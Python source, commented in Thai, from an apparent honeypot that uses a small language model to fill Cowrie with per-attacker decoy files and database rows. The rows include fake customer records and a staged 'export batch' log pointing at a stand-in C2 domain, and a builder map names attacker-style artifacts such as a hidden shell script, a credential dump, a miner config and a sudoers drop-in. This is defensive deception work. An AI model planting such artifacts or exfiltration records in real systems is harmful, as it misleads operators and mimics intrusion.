    # ทั้งที่พรอมต์บอกลำดับคอลัมน์เป็นข้อความอยู่แล้ว ("column 1 is X. column 2 is Y...") — โมเดลเล็ก
    # (1.5B) ทำตาม "ตัวอย่างรูปธรรม" ได้แม่นกว่า "คำบรรยาย" ล้วนๆ เพิ่มตัวอย่างแถวจริง 1 แถวต่อท้าย
    # fact (แทนที่จะแก้พรอมต์กลางใน prefetch_worker.py ซึ่งตารางอื่น เช่น payroll_export ของ Part 1
    # ใช้ร่วมอยู่แล้ว เสี่ยง regression ของที่ทำงานดีอยู่แล้ว — จำกัด fix ไว้แค่ตารางนี้)
    example_row = " | ".join([
        "Somchai Trading Co., Ltd.", "contact@somchai-trading.example",
        "02-123-4567", "15,000.00", "Regular customer, orders monthly.",
    ][: len(ai_cols)])
    fact = (
        f"department={entry.get('department')}, sensitivity={entry.get('sensitivity')}. "
        f"Style guide: {entry.get('style_hint', '')} "
        f"Example row showing the exact format (write completely different values, never reuse "
        f"this example): {example_row}"
    )
    ai_rows = pw._generate_decoy_rows(fact, ai_cols, tier, content_type, row_count=4)
    # แก้เพิ่ม 2026-09-01 (verify รอบหลังใส่ few-shot): คอลัมน์เรียงถูกครบแล้ว แต่บางแถวโมเดลแปะเลข
    # ลำดับข้อนำหน้าค่าแรก (เช่น "1. Somchai Trading Co., Ltd.") ปนมากับข้อมูลจริง (ไม่ใช่แถว header
    # ปลอม -- ค่าที่เหลือถูกต้องหมด) ตัดออกเฉพาะคอลัมน์แรก (customer_name อยู่ตำแหน่งแรกของ ai_cols
    # เสมอตาม schema) เป็น cosmetic cleanup ไม่ใช่การกรองทิ้งทั้งแถว
    ai_rows = [
        [re.sub(r"^\d+[.)]\s*", "", v) if i == 0 else v for i, v in enumerate(r)]
        for r in ai_rows
    ]
    tax_idx = entry["columns"].index("tax_id")
    rows = []
    for r in ai_rows:
        r = list(r)
        r.insert(tax_idx, _gen_thai_tax_id())
        rows.append(r)
    if content_type == "deceive":
        rows.append(_legacy_erp_lure_row(entry["columns"]))
    return json.dumps({"rows": rows})


def _exfil_staging_row(cols: list[str], batch_num: int, content_type: str, note: str) -> list[str]:
    source_pool = ["res_partner", "account_move", "payroll_export", "db_access_audit"]
    if content_type == "deceive":
        # reuse โดเมน C2 เดียวกับ /tmp/.rc.sh (ไม่สร้างโดเมนสมมติใหม่ซ้ำซ้อน — เรื่องเดียวกัน)
        dest = "malicious-c2.net"
        status = "completed - verified"
    else:
        dest = random.choice(["nas-backup.internal.corp", "backup-srv.internal.corp"])
        status = random.choice(["completed", "scheduled"])
    values = {
        "batch_id": f"exp-2026{batch_num:04d}",
        "source_table": random.choice(source_pool),
        "row_count": str(random.randint(80, 4200)),
        "staged_at": f"2026-{random.randint(6, 8):02d}-{random.randint(1, 28):02d} 0{random.randint(1, 4)}:00",
        "destination_host": dest,
        "status": f"{status} ({note})" if note else status,
    }
    return [values.get(c, "") for c in cols]


def _build_exfil_staging_log(entry: dict, tier: int, content_type: str) -> str:
    """ตาราง DB — deterministic ล้วนๆ (batch_id/source_table/row_count/staged_at สุ่มจาก pool)
    บวก AI slot สั้น 1 จุด (note) ตาม content_policy='hybrid' ของ schema — ไม่ให้ AI แต่ง
    destination_host/status เอง (ต้องควบคุมให้ deceive ใช้ malicious-c2.net เป๊ะเสมอ ไม่ใช่ค่าที่
    โมเดลอาจแต่งเพี้ยน)"""
    slot = (entry.get("ai_slots") or [{}])[0]
    note = _ai_fill_slot(
        slot.get("purpose", "1 short status note for a backup log row"),
        validate=lambda t: len(t) <= 60 and not re.search(r"[$();|&`]", t),
        fallback=slot.get("fallback", "'automated export batch'").strip("'"),
        content_type=content_type,
    )
    rows = [
        _exfil_staging_row(entry["columns"], i, content_type, note if i == 1 else "")
        for i in range(1, 4)
    ]
    return json.dumps({"rows": rows})


_BUILDERS = {
    "/etc/rc.local": _build_rc_local,
    "/usr/local/bin/sysupdate": _build_sysupdate,
    "/etc/sudoers.d/99-sysupdate": _build_sudoers,
    "/tmp/.rc.sh": _build_rc_sh,
    "/var/www/legacy-erp/.env": _build_env,
    "/etc/nas_mount.conf": _build_nas_mount_conf,
    "/var/www/legacy-erp/config.php": _build_config_php,
    "/tmp/backup_exfil/manifest.txt": _build_manifest_txt,
    "/tmp/.creds_all.txt": _build_creds_all_txt,
    ".config/xmrig/config.json": _build_xmrig_config,
    "legacy_erp_customers": _build_legacy_erp_customers,
    # แก้ 2026-09-02 (roleplay_audit_remediation C1): เปลี่ยนคีย์จาก "exfil_staging_log" -- ชื่อเดิมมี
    # คำว่า "exfil" (ศัพท์ red-team ของการขโมยข้อมูล) ไม่มีบริษัทจริงตั้งชื่อตารางแบบนี้ ต้องตรงกับ
    # table_name ใหม่ใน vfs_schema_part2_phase_adaptive.json
    "export_batch_log": _build_exfil_staging_log,
}


def _build_content(entry: dict, tier: int, content_type: str) -> str | None:
    if entry["type"] == "dir":
        return None  # dir ไม่มีเนื้อหา -- fs.mkdir() ฝั่ง Cowrie เฉยๆ
    key = _entry_key(entry)
    builder = _BUILDERS.get(key)
    if builder is None:
        raise KeyError(f"ไม่มี builder สำหรับ {key} -- ต้องเพิ่มใน _BUILDERS")
    return builder(entry, tier, content_type)


# ------------------------------------------------------------------------------------------
# ชั้น 1: เตรียมล่วงหน้า (background, ไม่มี live-call ตอน attacker โต้ตอบจริง)
# ------------------------------------------------------------------------------------------
def warm_phase(session_id: str, phase: str, tier: int) -> None:
    """generate เนื้อหาไว้ล่วงหน้าทั้ง deceive/normal สำหรับทุก target ของ phase นี้ -- idempotent
    (claim/get/put ผ่าน `phase_store` คีย์ (session_id, door=PHASE2_DOOR, target, tier, content_type))

    เปลี่ยน 2026-09-19 (คำขอผู้ใช้ — ดู docs/reports/pi_phase_adaptive_per_session_files_2026-09-19.md):
    เดิมเก็บผ่าน `template_store` คีย์ (door,target,tier,content_type) = แชร์ข้าม session (attacker
    ทุกคน tier เดียวกันได้ไฟล์เหมือนกันเป๊ะ = ดู static). ย้ายมา `phase_store` ที่มี `session_id` ใน key →
    ไฟล์ลวง **generate ใหม่ต่อ attacker (ต่อ session/IP)** แต่ skip-if-exists ต่อ session ยังทำงาน (re-read
    ภายในคนเดียวกันนิ่ง ไม่ gen ทุกคำสั่ง). `template_store` (Part 1 tier-shared) ไม่ถูกแตะ.

    แก้บั๊กจริง 2026-09-01 (เจอระหว่างทดสอบ Part 2 DB — ดู
    docs/reports/pi_part2_db_findings_fix_2026-09-01.md): เดิม except ครอบทั้ง for-loop เดียว —
    target ไหน throw (เช่น AI backend ล่มชั่วคราวตอน `legacy_erp_customers`) จะ abort ทั้งฟังก์ชัน
    ทันที **target อื่นที่ยังไม่เคย warm ในลำดับถัดไปของ phase เดียวกันไม่ถูกลองเลยสักครั้ง**
    (ยืนยันจริง: `exfil_staging_log` ที่มาทีหลัง `legacy_erp_customers` ในลำดับ schema ไม่เคยถูก
    generate เลยตราบใดที่ตัวก่อนหน้ายังพังอยู่) เปลี่ยนเป็น catch ต่อ (target, content_type) แทน —
    ตัวที่พังแค่ log ไว้แล้วข้ามไปตัวถัดไป ไม่กระทบกัน สถานะสุดท้ายเป็น "pending" ถ้ามีตัวไหนพังแม้แต่
    ตัวเดียว (ให้ retry รอบหน้าเฉพาะตัวที่ยังไม่มีเนื้อหาจริงๆ ผ่าน `template_store.get()` เช็คก่อน
    เสมออยู่แล้ว) หรือ "done" ถ้าผ่านหมดจริง — คู่กับ `try_claim()` ที่แก้ให้ reclaim "pending" ได้
    ทันทีแล้ว (ดู template_store.py) ระบบจะ self-heal เองรอบถัดไปโดยไม่ต้องมีใครลบ row มือ"""
    targets = _targets_by_phase().get(phase, [])
    if not targets:
        return
    if not phase_store.try_claim(session_id, PHASE2_DOOR, phase, tier):
        return
    had_failure = False
    for entry in targets:
        if entry["type"] == "dir":
            continue  # dir ไม่มีเนื้อหาให้ warm
        key = _entry_key(entry)
        for content_type in ("deceive", "normal"):
            if phase_store.get(session_id, PHASE2_DOOR, key, tier, content_type) is not None:
                continue
            try:
                content = _build_content(entry, tier, content_type)
                phase_store.put(session_id, PHASE2_DOOR, key, tier, content_type, content)
                phase_store.touch(session_id, PHASE2_DOOR, phase, tier)
            except Exception as e:
                had_failure = True
                print(
                    f"phase_adaptive: warm failed for {key!r} content_type={content_type} "
                    f"phase={phase} tier={tier} session={session_id}: {e!r}"
                )
                continue  # target ถัดไปยังลองต่อได้ตามปกติ ไม่ abort ทั้ง phase
    phase_store.set_status(session_id, PHASE2_DOOR, phase, tier, "pending" if had_failure else "done")


def warm_next_phase(session_id: str, current_phase: str, tier: int) -> None:
    """เดา phase ถัดไปจาก PHASE_ORDER แล้วเตรียมไว้ล่วงหน้า -- เรียกจาก router.py::track() ทุก
    คำสั่ง (thread เดียวกับ _fire_and_forget_warm เดิมของ Part 1). `session_id` ร้อยลง warm_phase
    เพื่อให้ content per-session (2026-09-19)"""
    nxt = _next_phase(current_phase)
    if nxt is not None:
        warm_phase(session_id, nxt, tier)
    # เผื่อ phase กระโดดข้ามหลายขั้นในคำสั่งเดียว (เช่น คำสั่งแรกตรง Actions_on_Objectives เลย) --
    # warm current phase เองด้วยเป็น safety net (ไม่ใช่แค่เดา "ถัดไป" จากที่เคยอยู่)
    warm_phase(session_id, current_phase, tier)


def warm_from_phase(session_id: str, current_phase: str, tier: int) -> None:
    """P5 warm-on-lock (ดู docs/reports/pi_warm_on_lock_2026-09-18.md) — พอ classifier ล็อก tier
    แล้ว เตรียมเนื้อหา Part-2 ของ **ทุก phase ตั้งแต่ปัจจุบันไปข้างหน้า** สำหรับ tier ที่ล็อก (attacker
    เดินหน้า phase อย่างเดียว = SessionPhaseTracker.update เดินหน้าเท่านั้น) — front-load generation
    ทันทีที่รู้ tier จริง กัน gen ไม่ทันตอนกระโดดเข้า phase ที่มีไฟล์ลึก. ต่างจาก warm_next_phase ที่
    เตรียมแค่ next+current: อันนี้กวาดยาวถึงปลาย kill-chain. idempotent (warm_phase claim ต่อ target
    ผ่าน template_store) เรียกซ้ำกี่ครั้งไม่เปลือง. หนัก (serial hailo) จึงต้องเรียกใน thread แยกเสมอ
    — router ยิงใน _warm_on_lock() thread"""
    order = SessionPhaseTracker.PHASE_ORDER
    try:
        start = order.index(current_phase)
    except ValueError:
        start = 0  # phase แปลกที่ไม่รู้จัก -- warm ตั้งแต่ต้น (ปลอดภัยกว่าข้าม)
    for p in order[start:]:
        warm_phase(session_id, p, tier)


# ------------------------------------------------------------------------------------------
# ชั้น 2: วางไฟล์แบบเร็ว (เรียกจาก endpoint /v1/phase_adaptive/placements) -- ไม่มี live-call
# (เนื้อหาต้องถูกเตรียมไว้แล้วจากชั้น 1)
#
# เพิ่ม 2026-08-30 (มติผู้ใช้ — แก้ก่อนไปต่อฝั่ง Cowrie): เดิม all-or-nothing ต่อ phase (ถ้ามีไฟล์
# ไหนใน phase ยังไม่พร้อมแม้แค่ไฟล์เดียว คืนว่างทั้งหมด) ปัญหาคือ Actions_on_Objectives มี 7 ไฟล์
# ใช้เวลาเตรียมเต็ม ~165s (verify จริงบน Pi) ถ้า attacker กระโดดเข้า phase นี้เป็นคำสั่งแรกจะไม่เห็น
# อะไรเลยนานเกินไป -- เปลี่ยนเป็น **partial-ready**: คืนเฉพาะไฟล์ที่พร้อมแล้ว ณ ตอนนี้ (warm_phase()
# เขียนเข้า template_store ทีละไฟล์ระหว่างทำงานอยู่แล้ว ไม่ได้ batch ตอนจบ — เห็นผลได้ทันทีที่ไฟล์
# ไหนเสร็จก่อน) ฝั่ง Cowrie (ยังไม่ implement) ต้อง dedup เอง (จำ path ที่วางไปแล้ว ไม่วางซ้ำ) และ
# เรียกซ้ำเรื่อยๆ จนกว่า all_ready=True (ไม่ต้องรอ phase เปลี่ยนอีกรอบถึงจะเช็คซ้ำได้)
# ------------------------------------------------------------------------------------------
_action_lock = threading.Lock()
_session_phase_action: dict[tuple[str, str, str], str] = {}  # (session_id, phase, attacker_type) -> action


def _get_or_sample_action(session_id: str, phase: str, attacker_type: str) -> str:
    """สุ่ม action ผ่าน Nash equilibrium จริงครั้งเดียวต่อ (session, phase, attacker_type) -- ถ้าถูก
    เรียกซ้ำ (เช่น retry เพราะเนื้อหายังไม่พร้อมรอบก่อน) คืนค่าเดิมที่เคยสุ่มไว้ ไม่ resample ใหม่

    เพิ่ม attacker_type เข้า cache key 2026-09-09 (defense-in-depth คู่กับ gate ใน app.py::
    phase_adaptive_placements -- ดู docs/reports/pi_part2_classify_gate_2026-09-09.md): เดิม
    key=(session_id, phase) ทำให้ถ้า action ถูกสุ่มตอน attacker_type ยังเป็น default 'Bot' (phase
    ถึงก่อน classifier ล็อก) จะค้าง Bot mix ตลอด แม้ภายหลังจำแนกเป็น APT ก็ไม่ resample. ตอนนี้ gate
    กันไม่ให้เรียกก่อนล็อกอยู่แล้ว แต่ผูก type เข้า key ด้วยกันพลาดถ้ามี caller อื่นในอนาคต

    เพิ่ม L2 persist 2026-09-18 (Track B P2 — gap A, ดู
    docs/reports/pi_action_flavor_persist_2026-09-18.md): เดิม cache เป็น dict แรมตัวเดียว หายตอน
    deception-core restart/rebuild → คำสั่งถัดไปของ IP เดิมเรียกฟังก์ชันนี้แล้ว `sample_action()`
    (Nash mixed-strategy = สุ่ม) สุ่มใหม่ → flavor พลิก deceive↔normal กลาง identity. ตอนนี้ทำ 2 ชั้น:
    L1 = dict แรม (เร็ว — placement poll ถี่มากระหว่างรอ all_ready) · L2 = SQLite ผูก session_id
    (stable ต่อ IP) ผ่าน session_store — L1 miss ก็โหลดจาก L2 ได้ action เดิม, L2 miss ค่อยสุ่มจริง
    ครั้งเดียวแล้ว persist. session_id stable ต่อ IP → identity เดิมได้ flavor เดิมตลอดอายุ 7 วัน"""
    key = (session_id, phase, attacker_type)
    with _action_lock:
        if key in _session_phase_action:
            return _session_phase_action[key]
        # L2: เคย persist ไว้แล้วไหม (รอด core restart ตลอดอายุ identity)
        stored = session_store.get_session_action(session_id, phase, attacker_type)
        if stored is not None:
            _session_phase_action[key] = stored
            return stored
        # ยังไม่เคย — สุ่มจริงครั้งเดียวแล้ว persist (set คืน action ของ winner เผื่อ race ระดับ DB)
        action = sample_action(get_action_probabilities(attacker_type, phase))
        action = session_store.set_session_action(session_id, phase, attacker_type, action)
        _session_phase_action[key] = action
        return action


def get_action_and_delay(session_id: str, phase: str, attacker_type: str) -> tuple[str, int]:
    """คืน (action, extra_delay_ms) ของ phase นี้ -- ดึงออกมาจาก logic ที่เคย inline อยู่ใน
    get_placements() (บรรทัด "action = _get_or_sample_action(...)" + "extra_delay_ms =
    get_extra_delay_ms(action)") ให้เป็นจุดเดียว (CLAUDE.md §5) เพิ่ม 2026-09-12 (grilling session,
    Work Item 1: ทำให้ Part 2 "delay" action หน่วงเวลาจริง -- ดู
    ~/.claude/plans/attacker-polished-seahorse.md) เพื่อให้ `core/router.py::track()` เรียกใช้ action
    เดียวกันกับที่ `/v1/phase_adaptive/placements` ใช้ (ผ่าน cache ตัวเดียวกันใน
    `_get_or_sample_action`) -- **สำคัญ**: ต้องใช้ฟังก์ชันนี้ ไม่ใช่ `brain.compute_levers()` สำหรับ
    การตัดสิน delay เพราะ `compute_levers()` เรียก `sample_action()` สดใหม่ทุกครั้งไม่ cache (ใช้
    สำหรับเลือก content flavor ของ Part 1 เท่านั้น) — ถ้าใช้ compute_levers() แทน จะได้ action ที่
    ต่างกันได้ในแต่ละคำสั่งของ phase เดียวกัน ขัดกับมติผู้ใช้ที่ว่า "อยู่ phase เดียวกันต้องได้ action
    เดียวกัน" ฟังก์ชันนี้การันตี consistency นั้นโดยผ่าน cache เดิมของ _get_or_sample_action ตรงๆ"""
    action = _get_or_sample_action(session_id, phase, attacker_type)
    return action, get_extra_delay_ms(action)


# เพิ่ม 2026-09-01: dedup การ apply ตาราง DB จริง ต่อ (decoy_session_id, table_name) — get_placements()
# ถูก poll ซ้ำได้ระหว่างรอ all_ready เหมือนไฟล์ ถ้าไม่กันซ้ำจะ DELETE+INSERT ทับตัวเองไปเรื่อยๆ
_table_lock = threading.Lock()
_table_applied: set[tuple[str, str]] = set()


def _apply_table_placement(entry: dict, decoy_session_id: str, content: str) -> bool:
    """สร้างตาราง (CREATE TABLE IF NOT EXISTS ผ่าน _ensure_decoy_table ตัวเดียวกับ Part 1) + insert
    แถวจริงลง Postgres schema "decoy" — content คือ JSON string {"rows": [[...], ...]} ที่
    warm_phase() เตรียมไว้ล่วงหน้าแล้ว (ไม่มี live-call ตรงนี้เลย แค่ parse + query DB) คืน True ถ้า
    สำเร็จ (หรือเคย apply ไปแล้วสำหรับ session+table นี้) False ถ้าล้มเหลว (caller ปฏิบัติเหมือน
    "ยังไม่พร้อม" — retry รอบหน้าธรรมชาติเหมือน content ที่ยังไม่พร้อม ไม่ throw ออกไปให้ endpoint พัง)"""
    table = entry["table_name"]
    key = (decoy_session_id, table)
    with _table_lock:
        if key in _table_applied:
            return True
        try:
            rows = json.loads(content)["rows"]
            cols = entry["columns"]
            conn = pw._pg_connect()
            conn.autocommit = True
            try:
                cur = conn.cursor()
                pw._ensure_decoy_table(cur, _DECOY_SCHEMA_NAME, table, cols, extra_cols=["session_id"])
                # ล้างแถวเดิมของ session นี้ก่อนเสมอ -- safety net เผื่อถูกเรียกซ้ำโดย race (ปกติ
                # _table_applied กันไว้แล้วในตัว process นี้ แต่ deception-core อาจมีมากกว่า 1 worker
                # ในอนาคต) DELETE ก่อน INSERT idempotent ไม่มีผลเสียถ้าไม่มีแถวเดิมอยู่แล้ว
                cur.execute(
                    f'DELETE FROM "{_DECOY_SCHEMA_NAME}"."{table}" WHERE session_id=%s',
                    (decoy_session_id,),
                )
                col_list = ", ".join(f'"{c}"' for c in cols)
                placeholders = ", ".join(["%s"] * (2 + len(cols)))
                for i, row in enumerate(rows, start=1):
                    cur.execute(
                        f'INSERT INTO "{_DECOY_SCHEMA_NAME}"."{table}" '
                        f'(id, session_id, {col_list}) VALUES ({placeholders})',
                        [i, decoy_session_id, *row],
                    )
            finally:
                conn.close()
        except Exception as e:
            print(f"phase_adaptive: table placement failed for {table} session={decoy_session_id}: {e!r}")
            return False
        _table_applied.add(key)
        return True


def get_placements(session_id: str, phase: str, tier: int, attacker_type: str,
                    decoy_session_id: str | None = None) -> dict:
    """คืน {"all_ready": bool, "action": str, "extra_delay_ms": int, "placements": [...]}
    placements มีเฉพาะไฟล์ที่เนื้อหาพร้อมแล้ว ณ ตอนนี้เท่านั้น (partial-ready, ดู comment หัวข้อ
    "ชั้น 2" ด้านบน) -- ไฟล์ที่ยังไม่พร้อมจะไม่ถูกรวมมาเลย ไม่ใช่ placeholder ว่าง -- ผู้เรียกต้อง
    เรียกซ้ำได้เรื่อยๆ (dedup path เอง) จนกว่า all_ready=True แต่ละอัน:
    {"path", "type", "content", "owner", "group", "mode", "path_note"}

    แก้เพิ่ม 2026-08-30 (reconnect-gap fix — ดู
    docs/reports/pi_part2_track_rm_mv_cp_touch_chmod_2026-08-30.md §ข้อสังเกตเพิ่มเติม): เดิมคืน
    เฉพาะไฟล์ของ `phase` เดียวที่ขอมา — ถ้า Cowrie session ถูก reconnect กลางทาง (fs object ใหม่
    ไม่มี state เดิม) จะไม่มีทางรู้ว่ามี phase ก่อนหน้าที่ยัง generate ไม่เสร็จ/ยังไม่เคย placed
    ค้างอยู่ (เพราะ Cowrie ฝั่งนั้นรู้จักแค่ phase ปัจจุบันตัวเดียวที่ /v1/track รายงานมา) — เปลี่ยน
    เป็นกวาดทุก phase ตั้งแต่ต้น `SessionPhaseTracker.PHASE_ORDER` จนถึง `phase` ที่ขอมา (inclusive)
    รวม placements เข้าด้วยกันในคำตอบเดียว — Cowrie ฝั่งรับไม่ต้องแก้อะไรเลย (แค่ได้ placements
    ครบขึ้นในคำตอบเดิม, dedup ผ่าน `fs._phase2_placed_paths` อยู่แล้วอัตโนมัติ) `action`/
    `extra_delay_ms` ที่คืนกลับยังคงอ้างอิงจาก `phase` ที่ขอมาเป็นหลัก (ตัวปัจจุบันจริง) ส่วน phase
    ก่อนหน้าใช้ action ของตัวเอง (sample แยกต่างหากผ่าน `_get_or_sample_action` เหมือนเดิม) แค่ไม่ส่ง
    field เดี่ยวๆ ออกมาให้ผู้เรียก (ผู้เรียกไม่เคยใช้ extra_delay_ms ของ phase เก่าอยู่แล้ว)

    เพิ่ม 2026-09-01 (`decoy_session_id`): ใช้แท็กแถว DB ของ target ประเภท "table" เท่านั้น (ผูก
    session_id เดียวกับที่ Part 1/psql.py ใช้กรอง SELECT — คนละตัวกับ `session_id` พารามิเตอร์หลัก
    ของฟังก์ชันนี้ที่มาจาก session_store แบบผูก ip เดิม ยังใช้เป็นคีย์ sample action เหมือนเดิมทุก
    ประการ ไม่เปลี่ยน) ถ้าเป็น None (เช่น login_decoy ของ session นี้ล้มเหลว/ยังไม่เสร็จ) target
    ประเภท table จะถูกข้ามไปเหมือน "เนื้อหายังไม่พร้อม" ไม่ error"""
    order = SessionPhaseTracker.PHASE_ORDER
    try:
        idx = order.index(phase)
        phases_to_check = order[: idx + 1]
    except ValueError:
        phases_to_check = [phase]  # phase แปลกที่ไม่รู้จัก -- ไปเช็คแค่ตัวเดียวเหมือนเดิม ไม่ error

    placements: list[dict] = []
    all_ready = True
    action_for_requested_phase = None
    extra_delay_for_requested_phase = 0

    for p in phases_to_check:
        targets = _targets_by_phase().get(p, [])
        if not targets:
            continue  # phase นี้ไม่มี target ใน schema (เช่น Reconnaissance) -- ข้าม ไม่กระทบ all_ready

        action, extra_delay_ms = get_action_and_delay(session_id, p, attacker_type)
        content_type = get_content_mode(action)  # deceive -> deceive, lure/delay -> normal
        if p == phase:
            action_for_requested_phase = action
            extra_delay_for_requested_phase = extra_delay_ms

        phase_missing = False
        for entry in targets:
            key = _entry_key(entry)
            if entry["type"] == "table":
                # เพิ่ม 2026-09-01 — apply จริงลง Postgres ตรงนี้เลย (ไม่ใช่ให้ Cowrie เขียนเอง
                # เหมือนไฟล์ เพราะ Cowrie ฝั่ง phase_adaptive.py ไม่มี credential ต่อ Postgres แยก
                # ต่างหาก ใช้ตัวที่ deception-core มีอยู่แล้วจาก prefetch_worker._pg_connect())
                content = phase_store.get(session_id, PHASE2_DOOR, key, tier, content_type)
                if content is None or decoy_session_id is None or not _apply_table_placement(
                    entry, decoy_session_id, content
                ):
                    all_ready = False
                    phase_missing = True
                    continue
                placements.append({
                    "path": key, "path_note": None, "type": "table",
                    "content": None, "owner": None, "group": None, "mode": None,
                })
                continue
            if entry["type"] != "dir":
                content = phase_store.get(session_id, PHASE2_DOOR, key, tier, content_type)
                if content is None:
                    # ยังไม่พร้อม (background ยัง generate ไม่ทัน) -- ข้ามไฟล์นี้ไปก่อน ไม่ error ไม่
                    # block ไฟล์อื่นที่พร้อมแล้ว ไม่เรียก AI สดตรงนี้เด็ดขาด
                    all_ready = False
                    phase_missing = True
                    continue
            else:
                content = None
            placements.append({
                "path": key,
                "path_note": entry.get("path_note"),
                "type": entry["type"],
                "content": content,
                "owner": entry.get("owner"),
                "group": entry.get("group"),
                "mode": entry.get("mode"),
            })

        if phase_missing:
            # safety net เฉยๆ -- ปกติ warm_phase() ถูก trigger ไปแล้วจาก track()/warm_next_phase()
            # try_claim() ข้างในกันซ้ำซ้อนอยู่แล้ว เรียกซ้ำได้ไม่มีผลเสีย -- แยกต่อ phase (ไม่ใช่แค่
            # phase ที่ขอมา) กัน phase เก่าที่ไม่เคยถูก warm มาก่อนเลยไม่มีวันเริ่ม generate
            threading.Thread(target=warm_phase, args=(session_id, p, tier), daemon=True).start()

    return {
        "all_ready": all_ready,
        "action": action_for_requested_phase,
        "extra_delay_ms": extra_delay_for_requested_phase,
        "placements": placements,
    }
